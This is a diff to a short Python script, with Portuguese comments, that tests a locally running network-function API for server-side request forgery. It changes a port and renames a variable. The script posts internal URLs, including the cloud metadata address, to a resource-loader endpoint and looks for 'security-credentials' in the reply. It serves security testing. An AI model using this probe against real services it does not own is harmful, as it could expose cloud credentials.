@@ -6,7 +6,7 @@ import time
 #--- Configurações de Ambiente (Valores do nefcfg.yaml) ---
 NF_CONFIG = {
     "NEF_IP": "127.0.0.1",
-    "NEF_PORT": 19509
+    "NEF_PORT": 29509
 }
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -19,18 +19,18 @@ def test_ssrf():
     nf_api_url = f"http://{NF_CONFIG['NEF_IP']}:{NF_CONFIG['NEF_PORT']}/api/resource_loader" 
     target_param = "url"
 
-    test_endpoints = [
+    test_endepoints = [
         "http://127.0.0.1:80",
         "http://169.254.169.254/latest/meta-data"
     ]
 
     vulnerable_found = False
-    for url in test_endpoints:
+    for url in test_endepoints:
         try:
             start_time = time.time()
             response = requests.post(nf_api_url, json={target_param: url}, timeout=5)
             end_time = time.time()
-
+            
             if response.status_code == 200 and "security-credentials" in response.text:
                 print("[!!!] VULNERABILIDADE SSRF DETECTADA! Acesso a metadados de nuvem.")
                 vulnerable_found = True
@@ -44,7 +44,7 @@ def test_ssrf():
             pass
 
     if not vulnerable_found:
-        print("[+] SSRF não detectado com payloads de teste.")
+        print("[+] SSRF não detectado com payloads de teste")
 
 if __name__ == "__main__":
     test_ssrf()
